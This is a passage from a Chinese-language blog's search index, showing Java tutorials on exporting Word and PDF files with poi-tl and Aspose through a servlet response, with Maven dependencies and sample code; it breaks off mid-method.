class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>system<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>systemPath</span><span class="token punctuation">></span></span>${project.basedir}/src/main/resources/lib/aspose-words-21.11-jdk17.jar<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>systemPath</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--        pdf转图片--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.pdfbox<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>pdfbox<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.0.27<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><h2 id="模板样式"><a href="#模板样式" class="headerlink" title="模板样式"></a>模板样式</h2><p><img src="/images/%E5%AF%BC%E5%87%BA%E5%9B%BE%E7%89%87%E6%A8%A1%E6%9D%BF%E6%A0%B7%E5%BC%8F.png" alt="模板样式"></p><h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>XWPFTemplate<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>data<span class="token punctuation">.</span>Pictures<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>data<span class="token punctuation">.</span>TextRenderData<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WordTemplateExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 创建一个HashMap来存储需要替换的文本和图片</span>        HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Object<span class="token operator">></span> datas <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//需要在Word模板中配置{{newName}}和{{@image}}标签，用于替换文本和图片</span>        datas<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"newName"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TextRenderData</span><span class="token punctuation">(</span><span class="token string">"替换的文本"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//本地图片</span>        <span class="token comment" spellcheck="true">//datas.put("image", Pictures.ofLocal("C:\\Users\\Administrator\\Desktop\\1.png").size(120, 120).create());</span>        <span class="token comment" spellcheck="true">//网络图片</span>        datas<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"image"</span><span class="token punctuation">,</span> Pictures<span class="token punctuation">.</span><span class="token function">ofUrl</span><span class="token punctuation">(</span><span class="token string">"https://img-blog.csdnimg.cn/591b532b000544838d1a59b48d6c78c3.png"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 加载Word模板</span>        XWPFTemplate template <span class="token operator">=</span> XWPFTemplate<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\Administrator\\Desktop\\模板.docx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 替换模板中的标签</span>        template<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>datas<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将结果写入一个新的Word文件</span>        FileOutputStream out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\Administrator\\Desktop\\output.docx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        template<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        template<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="/images/Word%E5%AF%BC%E5%87%BA%E5%9B%BE%E7%89%87.png" alt="导出结果"></p>]]></content>
      
      
      <categories>
          
          <category> Word </category>
          
          <category> PDF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Word操作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Word和PDF导出</title>
      <link href="/2022/06/03/word-he-pdf-dao-chu-httpservletresponse/"/>
      <url>/2022/06/03/word-he-pdf-dao-chu-httpservletresponse/</url>
      
        <content type="html"><![CDATA[<h1 id="Word和PDF导出（HttpServletResponse）"><a href="#Word和PDF导出（HttpServletResponse）" class="headerlink" title="Word和PDF导出（HttpServletResponse）"></a>Word和PDF导出（HttpServletResponse）</h1><h2 id="依赖导入"><a href="#依赖导入" class="headerlink" title="依赖导入"></a>依赖导入</h2><pre class=" language-xml"><code class="language-xml">        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.poi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>poi-ooxml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.2.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--        导出Word--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.deepoove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>poi-tl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.12.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--        Word转PDF--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.aspose<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>aspose-words<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>21.11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>system<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>systemPath</span><span class="token punctuation">></span></span>${project.basedir}/src/main/resources/lib/aspose-words-21.11-jdk17.jar<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>systemPath</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--        pdf转图片--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.pdfbox<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>pdfbox<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.0.27<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><h2 id="模板地址"><a href="#模板地址" class="headerlink" title="模板地址"></a>模板地址</h2><blockquote><p><a href="/images/Word/%E6%96%B0%E9%97%BB%E5%AF%BC%E5%87%BA%E6%A8%A1%E6%9D%BF.docx">模板</a></p></blockquote><h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><pre class=" language-java"><code class="language-java">    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/exportV4"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span>  <span class="token keyword">void</span> <span class="token function">export</span><span class="token punctuation">(</span>HttpServletResponse response <span class="token punctuation">,</span> String fileType <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            SimpleDateFormat format <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyy-MM-dd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//            String templatePath = "/reporter/" + "新闻导出模板.docx";</span>            String templatePath <span class="token operator">=</span> <span class="token string">"F:\\我的文件\\新闻导出模板.docx"</span><span class="token punctuation">;</span>            JSONObject jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            jsonObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"newName"</span><span class="token punctuation">,</span><span class="token string">"标题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            jsonObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"newDate"</span><span class="token punctuation">,</span>format<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            jsonObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"origin"</span><span class="token punctuation">,</span><span class="token string">"来源"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            jsonObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"emotion"</span><span class="token punctuation">,</span><span class="token string">"情感"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            jsonObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"level"</span><span class="token punctuation">,</span><span class="token string">"等级"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            jsonObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">,</span><span class="token string">"内容"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            jsonObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"keyword"</span><span class="token punctuation">,</span><span class="token string">"关键字"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"word"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>fileType<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                WordUtil<span class="token punctuation">.</span><span class="token function">downloadWordResponse</span><span class="token punctuation">(</span>response <span class="token punctuation">,</span>templatePath<span class="token punctuation">,</span>jsonObject<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"pdf"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>fileType<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                WordUtil<span class="token punctuation">.</span><span class="token function">downloadPdfResponse</span><span class="token punctuation">(</span>response <span class="token punctuation">,</span>templatePath<span class="token punctuation">,</span>jsonObject<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e <span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//打印日志</span>            Logger log <span class="token operator">=</span> LoggerFactory<span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>Test<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"word导出异常"</span><span class="token operator">+</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSONObject<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>deepoove<span class="token punctuation">.</span>poi<span class="token punctuation">.</span>XWPFTemplate<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>project<span class="token punctuation">.</span>tool<span class="token punctuation">.</span>PDFHelper<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>thymeleaf<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>TemplateEngineException<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpServletResponse<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span>StandardCharsets<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Files<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Paths<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>MessageDigest<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>text<span class="token punctuation">.</span>SimpleDateFormat<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Date<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>UUID<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * word 模版处理工具 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WordUtil</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 本地文件下载     *     * @param out:     * @param targetPath:     * @return: void     * @Author: CZM     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">downloadLocalFile</span><span class="token punctuation">(</span>OutputStream out<span class="token punctuation">,</span> String targetPath<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 检查目标文件是否存在</span>        File file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>targetPath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FileNotFoundException</span><span class="token punctuation">(</span><span class="token string">"File does not exist: "</span> <span class="token operator">+</span> targetPath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// 使用try-with-resources确保InputStream自动关闭</span>        <span class="token keyword">try</span> <span class="token punctuation">(</span>InputStream in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>targetPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> len<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 输出缓冲区中的剩余数据</span>            out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// 输入流会在这里自动关闭</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 导出Word     *     * @param response:     * @param templatePath:模板地址     * @param paramMap:         数据     * @return: void     * @Author: CZM     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">downloadWordResponse</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> String templatePath<span class="token punctuation">,</span> JSONObject paramMap<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 确保模板路径有效</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Files<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>templatePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"Template file not found: "</span> <span class="token operator">+</span> templatePath<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 计算文件名的哈希值</span>            MessageDigest messageDigest <span class="token operator">=</span> MessageDigest<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"MD5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            messageDigest<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>templatePath<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> digest <span class="token operator">=</span> messageDigest<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String fileName <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 设置响应头</span>            response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"application/vnd.openxmlformats-officedocument.wordprocessingml.document"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition"</span><span class="token punctuation">,</span> <span class="token string">"attachment;filename=\"template.docx\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition"</span><span class="token punctuation">,</span> <span class="token string">"attachment;filename*=UTF-8''"</span> <span class="token operator">+</span> fileName <span class="token operator">+</span> <span class="token string">".docx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 使用XWPFTemplate渲染模板</span>            XWPFTemplate template <span class="token operator">=</span> XWPFTemplate<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>templatePath<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>paramMap<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">(</span>OutputStream out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                template<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>                out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> TemplateEngineException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 可以根据实际情况记录日志</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 网络下载和本地下载PDF和Word     *     * @param response:     * @param templatePath: 模板文件     * @param paramMap:     数据     * @return: void     * @Author: CZM     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">downloadPdfResponse</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span> String templatePath<span class="token punctuation">,</span> JSONObject paramMap<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        String profile <span class="token operator">=</span> <span class="token string">"F:\\我的文件\\"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// String profile = "/tmp/pdf/";</span>        String random <span class="token operator">=</span> UUID<span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SimpleDateFormat simpleDateFormat <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyyMMddHHmmss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String format <span class="token operator">=</span> simpleDateFormat<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> random<span class="token punctuation">;</span>        String savePath <span class="token operator">=</span> profile <span class="token operator">+</span> format <span class="token operator">+</span> <span class="token string">".docx"</span><span class="token punctuation">;</span>        String pdfSavePath <span class="token operator">=</span> profile <span class="token operator">+</span> format <span class="token operator">+</span> <span class="token string">".pdf"</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"application/x-download;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-disposition"</span><span class="token punctuation">,</span> <span class="token string">"attachment;filename="</span> <span class="token operator">+</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".pdf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">(</span>OutputStream out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             XWPFTemplate template <span class="token operator">=</span> XWPFTemplate<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>templatePath<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>paramMap<span class="token punctuation">)</span><span class="token punctuation">)</span> 